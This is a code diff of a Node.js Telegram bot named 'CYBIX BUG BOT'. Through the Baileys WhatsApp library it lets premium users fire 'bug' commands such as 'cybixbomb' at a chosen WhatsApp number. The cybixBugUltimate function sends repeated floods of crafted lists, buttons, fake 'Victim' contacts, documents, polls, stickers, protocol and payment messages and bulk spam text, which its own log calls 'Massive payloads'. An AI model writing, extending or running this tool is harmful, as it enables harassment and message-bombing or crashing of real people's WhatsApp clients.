@@ -2,49 +2,32 @@
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 8080;
+app.get("/", (req, res) => res.send("CYBIX BUG BOT IS RUNNING!"));
+app.listen(PORT, () => console.log("[CYBIX][EXPRESS] Listening on port " + PORT));
 
-app.get("/", (req, res) => {
-  res.send("CYBIX BUG BOT IS RUNNING!");
-});
-app.listen(PORT, () => {
-  console.log("[CYBIX][EXPRESS] Listening on port " + PORT);
-});
+// ENV
+require("dotenv").config();
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const OWNER_ID = process.env.OWNER_ID;
 
-// DEPENDENCIES
+// DEPENDENCIES (ALL UPDATED & SUPPORTED)
 const fs = require("fs");
-const path = require("path");
-const dotenv = require("dotenv");
 const chalk = require("chalk");
 const moment = require("moment-timezone");
 const crypto = require("crypto");
 const { Telegraf } = require("telegraf");
+const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeInMemoryStore, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
 const axios = require("axios");
 const pino = require("pino");
-// Telegram extra
 const TelegramBot = require("node-telegram-bot-api");
 const { TelegramClient } = require("telegram");
 const readlineSync = require("readline-sync");
-// WhatsApp Baileys (latest stable)
-const {
-  default: makeWASocket,
-  useMultiFileAuthState,
-  fetchLatestBaileysVersion,
-  makeInMemoryStore,
-  generateWAMessageFromContent,
-  proto
-} = require("@whiskeysockets/baileys");
-// Others
 const qrcode = require("qrcode-terminal");
 const bodyParser = require("body-parser");
 const { Octokit } = require("@octokit/rest");
 const twilio = require("twilio");
 const archiver = require("archiver");
 const unzipper = require("unzipper");
-
-// ENV
-dotenv.config();
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const OWNER_ID = process.env.OWNER_ID;
 
 // DATA FILES
 const DATA_FILES = {
@@ -55,8 +38,6 @@ const DATA_FILES = {
 let premiumUsers = {};
 let adminUsers = [];
 let userActivity = {};
-
-// LOAD/SAVE MODULES
 function loadFile(file, fallback) {
   try { return JSON.parse(fs.readFileSync(file)); } catch { return fallback; }
 }
@@ -75,11 +56,10 @@ function recordUserActivity(userId, nickname) {
   saveFile(DATA_FILES.activity, userActivity);
 }
 
-// WHATSAPP MODULE
+// WHATSAPP MODULE (latest Baileys)
 let waClient = null;
 let waConnected = false;
 const waStore = makeInMemoryStore({ logger: pino().child({ level: "silent" }) });
-
 async function startWhatsapp() {
   const { state, saveCreds } = await useMultiFileAuthState("./wa-session");
   const { version } = await fetchLatestBaileysVersion();
@@ -120,7 +100,6 @@ let maintenance = {
   enabled: false,
   message: "CYBIX BUG is under maintenance by the owner. Please wait!"
 };
-
 const BANNER_IMAGE_URL = "https://imgur.com/a/b4ZAdYa";
 const bugTypes = [
   { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
@@ -159,6 +138,24 @@ function requireWA(ctx, next) {
 }
 
 // MENUS
+const telegramMenu = `
+━━━━━━━━━━━━━━━━━━
+CYBIX BUG SYSTEM
+━━━━━━━━━━━━━━━━━━
+OWNER INFO
+┏━━━━━━━━━━━━━━
+┃ ⎚ OWNER ID : ${OWNER_ID}
+┃ ⎚ OWNER : [your status]
+┃ ⎚ ADMIN : [your status]
+┃ ⎚ PREMIUM : [your status]
+┗━━━━━━━━━━━━━━
+┏━━━━━━COMMANDS━━━━━
+☞ /bugmenu
+☞ /ownermenu
+☞ /othermenu
+━━━━━━━━━━━━━━━━━━
+`;
+
 bot.start(async ctx => {
   const menu = `
 ━━━━━━━━━━━━━━━━━━
@@ -304,7 +301,6 @@ function bigSpamText(label, emoji) {
 }
 async function cybixBugUltimate(targetJid, label, emoji) {
   for (let i = 0; i < 7; i++) {
-    // List payload
     let listPayload = {
       title: `${label} LIST`,
       sections: Array.from({ length: 7 }, (_, j) => ({
@@ -315,20 +311,15 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         }]
       }))
     };
-    // Buttons
     let buttons = Array.from({ length: 7 }, () => ({
       buttonId: crypto.randomBytes(32).toString("hex"),
       buttonText: { displayText: `${label} ${emoji} BUTTON` },
       type: 1,
     }));
-
-    // Contact
     let contactVcard = {
       displayName: `${label} Contact`,
       vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${label} Victim\nTEL;type=CELL:${Math.floor(Math.random() * 10000000000)}\nEND:VCARD`
     };
-
-    // Document
     let documentMessage = {
       documentMessage: {
         url: "https://files.catbox.moe/w1r1mm.jpg",
@@ -340,8 +331,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
       }
     };
-
-    // Image
     let imageMessage = {
       imageMessage: {
         url: "https://files.catbox.moe/w1r1mm.jpg",
@@ -350,8 +339,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
       }
     };
-
-    // Location
     let locationMessage = {
       locationMessage: {
         degreesLatitude: Math.random() * 180 - 90,
@@ -361,8 +348,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
       }
     };
-
-    // Poll
     let pollMessage = {
       pollCreationMessage: {
         name: `${label} Poll`,
@@ -370,8 +355,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
         selectableOptionsCount: 7
       }
     };
-
-    // Sticker
     let stickerMessage = {
       stickerMessage: {
         url: "https://files.catbox.moe/w1r1mm.jpg",
@@ -387,7 +370,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       }
     };
 
-    // Compose and send all payloads, multiple times for brutal effect
     let msgList = generateWAMessageFromContent(
       targetJid,
       proto.Message.fromObject({
@@ -429,7 +411,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       await waClient.relayMessage(targetJid, msgPoll.message, { messageId: msgPoll.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgSticker.message, { messageId: msgSticker.key.id, participant: { jid: targetJid } });
     }
-    // Extra: system notification
     let sysNotification = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       protocolMessage: {
         key: { remoteJid: targetJid, id: crypto.randomBytes(12).toString("hex") },
@@ -438,7 +419,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       }
     }), { userJid: targetJid });
     await waClient.relayMessage(targetJid, sysNotification.message, { messageId: sysNotification.key.id, participant: { jid: targetJid } });
-    // Extra: invoice
     let invoiceMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       paymentInfoMessage: {
         currency: "USD",
@@ -450,7 +430,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       }
     }), { userJid: targetJid });
     await waClient.relayMessage(targetJid, invoiceMessage.message, { messageId: invoiceMessage.key.id, participant: { jid: targetJid } });
-    // Extra: quiz
     let quizMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       pollCreationMessage: {
         name: `${label} QUIZ`,
@@ -459,7 +438,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       }
     }), { userJid: targetJid });
     await waClient.relayMessage(targetJid, quizMessage.message, { messageId: quizMessage.key.id, participant: { jid: targetJid } });
-    // Extra: spam text
     for (let s = 0; s < 4; s++) {
       let spamMsg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
         conversation: bigSpamText(label, emoji)
@@ -469,8 +447,6 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     console.log(chalk.red.bold(`[CYBIX ${label}] Massive payloads sent to ${targetJid}`));
   }
 }
-
-// REGISTER ALL BUG COMMANDS
 for (const bug of bugTypes) {
   bot.command(bug.cmd, requireWA, requirePremium, async ctx => {
     const parts = ctx.message.text.split(" ");
